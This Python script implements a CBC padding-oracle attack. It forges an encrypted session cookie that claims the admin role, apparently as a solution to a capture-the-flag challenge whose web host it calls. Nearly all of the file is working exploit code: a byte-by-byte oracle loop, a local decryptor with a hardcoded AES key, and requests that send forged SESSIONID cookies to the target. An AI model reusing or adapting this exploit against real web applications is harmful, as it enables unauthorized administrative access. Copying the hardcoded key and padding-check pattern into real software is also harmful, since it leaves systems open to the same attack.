import base64
import requests
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding


def decrypt(data):
    key = b"Thisisakey!!!!!!"
    iv = data[0:16]
    ctext = data[16:]

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    ptext = decryptor.update(ctext) + decryptor.finalize()
    return ptext


def padded_oracle_check_local(data):
    ptext = decrypt(data)
    unpadder = padding.PKCS7(128).unpadder()
    data = unpadder.update(ptext)

    try:
        data += unpadder.finalize()
    except Exception:
        return False

    return True


def padded_oracle_check(data):
    # form cookie text
    test_bytes = b"\x00" * 16 + data
    encoded = base64.b64encode(test_bytes).decode("utf-8")
    print(encoded)

    url_real = "http://mb0f0g.ctf.cc-sw.com"
    url_test = "http://127.0.0.1:5000"
    headers = {
        "Content-type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    }
    cookies = {"SESSIONID": encoded}
    r = requests.get(url_real, cookies=cookies, headers=headers)
    print(r.history[0].headers["location"])
    match = "You+must+log+in+to+continue" not in r.history[0].headers["location"]
    return match


def attack():
    plaintxt_to_find = bytearray(b'{"role":"admin","user":"a"}\x05\x05\x05\x05\x05')
    prev_block = bytearray(os.urandom(16))
    to_calc_block = bytearray(b"\x00" * 16)
    final_ciphertext = prev_block

    # Find number of plaintext blocks
    num_blocks_to_calc = len(plaintxt_to_find) // 16

    for b in range(0, num_blocks_to_calc):
        pblock_index = num_blocks_to_calc - b - 1
        plaintext_block = plaintxt_to_find[16 * pblock_index : 16 * pblock_index + 16]
        for i in range(0, 16):
            byte_index = 15 - i
            found_byte = False
            for j in range(0, 256):
                print(f"Trying {j}")
                to_calc_block[byte_index] = j
                test_ctext = to_calc_block + prev_block
                success = padded_oracle_check_local(test_ctext)
                if success:
                    print(f"found: {j}")
                    found_byte = True
                    if byte_index > 0:
                        for x in range(byte_index, 16):
                            to_calc_block[x] = to_calc_block[x] ^ (i + 1) ^ (i + 2)
                    print(to_calc_block)
                    break

            if not found_byte:
                print(f"something went wrong: {byte_index}")
                return False

        for i in range(0, 16):
            to_calc_block[i] = to_calc_block[i] ^ 16 ^ plaintext_block[i]

        # setup for next block
        prev_block = to_calc_block
        to_calc_block = bytearray(b"\x00" * 16)
        final_ciphertext = prev_block + final_ciphertext

    print(f"Final ctext: {base64.b64encode(final_ciphertext).decode('utf-8')}")
    return True


if __name__ == "__main__":
    while True:
        success = attack()
        if success:
            break
